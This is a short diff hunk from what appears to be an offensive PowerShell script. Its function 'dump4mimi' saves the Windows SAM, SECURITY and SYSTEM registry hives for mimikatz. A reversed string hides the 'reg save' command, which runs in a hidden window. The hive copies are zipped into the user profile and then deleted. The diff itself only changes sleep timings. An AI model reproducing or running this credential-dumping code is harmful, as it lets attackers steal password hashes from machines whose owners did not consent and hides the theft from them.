@@ -91,10 +91,10 @@ function dump4mimi {
 	$ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
     Clear-Host
-    Start-Sleep -Seconds 6.7
+   sleep(7.5)
     cd C:\
     Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
-    Start-Sleep -Seconds 0.5
+  sleep(1.0)
     Clear-Host
 	Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
 	Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
